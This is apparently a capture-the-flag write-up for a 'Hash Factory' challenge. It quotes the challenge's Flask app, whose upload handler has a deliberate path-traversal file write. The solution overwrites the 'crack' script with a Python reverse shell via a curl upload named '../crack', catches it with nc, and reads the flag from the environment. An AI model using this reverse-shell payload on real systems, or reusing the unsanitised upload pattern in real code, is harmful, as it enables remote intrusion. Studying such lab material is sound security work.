# Hash Factory

```
Oi! My hash factory will crack any hashes you pass to it. I mean. try it!
```

Dockerfile is provided in attachment:

```docker
# welcome to our wonderful hash factory! lemme give you a tour!
# first, we start with the python base, it's slim allowing us
# to add the rest of our equipment safely!
FROM python:3.12-slim AS base

# we cant go far in this business without some uv protection.
# it helps with 'em pesky rays coming from all the hash cracking
COPY --from=ghcr.io/astral-sh/uv:0.7.3 /uv /uvx /bin/

# and... these are some flags, cant remember why we have them
ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1

# it ain't no factory if it isn't up to date, i must say..
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

# this is where all the manufacturing happens, we keep it all here
WORKDIR /app

# ah! one last thing, we must prepare our virtual environment; otherwise
# them wild packages will go rampant in our system!
RUN uv venv 
ENV PATH="/app/.venv/bin:$PATH"
# and yes, we need our beautiful flask to serve our goodies
RUN uv pip install flask==3.1.2;

# this is our main platform, it collects wild hash files from our customers
# and queues them up for our crack station. isn't it magnificent?
RUN cat <<EOF > main.py
from flask import Flask, request
from pathlib import Path
from subprocess import check_output

app = Flask(__name__)

hashes = Path.cwd() / 'hashes'
hashes.mkdir()

base = '<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css" /><div style="width:48rem;margin:2rem auto;">%s</div>'

@app.route('/', methods=["GET", "POST"])
def index():
    hash_file = request.files.get('hash_file')

    if not hash_file:
        return base % '''<p>hash_factory v1.0: u must pass the hash file!</p>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="hash_file" />
    <input type="submit" value="pass the hash" />
</form>'''

    hash_file.save(path := hashes / hash_file.filename)
    crack_results = check_output(["/app/crack", path], text=True)
    path.unlink()

    return base % ("<pre>" + crack_results + "</pre>")
EOF

# lo and behold! this is our crack station. it's so powerful
# it can crack numbers so high up beyond imagination! it can
# crack from 0 all the way to 1337. unbelievable, i told ya!
RUN cat <<EOF > crack
#!/app/.venv/bin/python
import sys, hashlib

md5 = lambda x: hashlib.md5(x.encode().strip()).hexdigest()

hashes_cracked = hashes = 0
print("hash_factory v1.0:")
try:
    for line in open(sys.argv[1], 'r', encoding="utf-8"):
        line = line.strip()

        # we only crack hashes here 
        if len(line) != len(md5('')):
            continue

        hashes += 1
        cracked = i = 0
        for hash in map(md5, map(str, range(1338))):
            if line == hash:
                print(f'{line}:{i}')
                cracked = 1; hashes_cracked += 1; break
            i += 1
        if not cracked:
            print(f'{line}:-')
    print(f"\ncracked {hashes_cracked}/{hashes}")
except Exception as ex:
    print(ex)
EOF

# least privileges they said is good for the factory
RUN useradd -m app && chown -R app:app /app && chmod 755 crack

# we cant serve our customers if we aint exposed, we serve on factory terminal 5000
EXPOSE 5000

USER app

# i would say that's enough touring, you now know it all. get to work!
CMD ["flask", "--app", "main.py", "run", "--host", "0.0.0.0", "--port", "5000"]
```

There is an arbitrary file write vulnerability:

```python
hash_file.save(path := hashes / hash_file.filename)
```

We can upload a python to get reverse shell to override `crack`:

```shell
# wait for reverse shell on on VPS
$ nc -l -p 1337 -v
# attack locally
$ cat test
#!/app/.venv/bin/python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("REDACTED",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
$ curl -vv -F "hash_file=@test;filename=../crack" http://cmvkynvk.playat.flagyard.com/
# print flag in reverse shell
$ env
FLASK_RUN_FROM_CLI=true
LC_CTYPE=C.UTF-8
WERKZEUG_SERVER_FD=3
PATH=/app/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DYN_FLAG=BHFlagY{22725eb594c9c8a4964aaa9f3d476aac}
PWD=/app
```
